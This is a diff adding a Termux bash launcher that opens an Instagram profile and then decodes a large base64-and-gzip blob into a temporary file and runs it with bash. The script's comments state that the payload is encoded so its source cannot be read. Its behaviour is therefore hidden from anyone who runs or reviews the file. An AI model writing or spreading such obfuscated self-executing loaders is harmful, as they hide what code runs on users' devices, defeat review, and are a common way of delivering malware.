@@ -1,0 +1,24 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# IPS protected launcher - Owner: HARI
+# The embedded payload is compressed/encoded so the original Bash source
+# is not directly readable. This is obfuscation, not cryptographic secrecy.
+# Open GitHub
+echo -e "\033[38;5;214m[$current_time]\033[0m \033[1;32m[INFO]:\033[0m]Instagram Open..."
+am start -a android.intent.action.VIEW -d "https://www.Instagram.com/_insrnx_" com.android.chrome >/dev/null 2>&1 || {
+    echo -e "\033[38;5;214m[$current_time]\033[0m \033[1;33m[WARNING]:\033[0m Could not open ."
+}
+set -e
+
+TMP="${TMPDIR:-$PREFIX/tmp}/ips_$$.sh"
+cleanup() { rm -f "$TMP"; }
+trap cleanup EXIT INT TERM
+
+PAYLOAD=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
+
+printf '%s' "$PAYLOAD" | base64 -d 2>/dev/null | gzip -d > "$TMP" || {
+    echo "[-] Failed to unpack IPS."
+    exit 1
+}
+
+chmod 700 "$TMP"
+exec bash "$TMP"
